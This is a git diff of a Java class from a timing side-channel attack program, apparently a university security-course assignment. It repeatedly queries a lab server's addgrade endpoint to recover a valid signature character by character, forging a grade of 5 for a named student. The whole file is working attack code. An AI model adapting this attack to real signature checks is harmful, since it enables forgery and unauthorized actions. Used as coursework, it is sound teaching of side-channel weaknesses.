@@ -4,16 +4,19 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.math.BigInteger;
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
 
 public class Processor implements Runnable {
 	private TimingAttack attack;
 	private char c;
+	private StringBuilder b;
 
-	public Processor(TimingAttack attack, char c) {
+	public Processor(TimingAttack attack, char c, StringBuilder b) {
 		this.c = c;
 		this.attack = attack;
+		this.b = b;
 	}
 
 	@Override
@@ -26,12 +29,18 @@ public class Processor implements Runnable {
 
 		BigInteger duration = BigInteger.ZERO;
 		long startTime = System.nanoTime();
+		try {
+			url = new URL(
+					"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Johan&grade=5&signature="
+							+ b.toString() + c);
+		} catch (MalformedURLException e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
 
-		for (int j = 0; j < 100; j++) {
+		for (int j = 0; j < 50; j++) {
 
 			try {
-
-				url = new URL("https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6823ea50b133c58cba" + c);
 
 				yc = url.openConnection();
 
@@ -51,7 +60,7 @@ public class Processor implements Runnable {
 		}
 
 		long endTime = System.nanoTime();
-		duration = BigInteger.valueOf((endTime - startTime) / 100);
+		duration = BigInteger.valueOf((endTime - startTime) / 50);
 		// System.out.println(duration);
 
 		if (attack.isMax(duration)) {
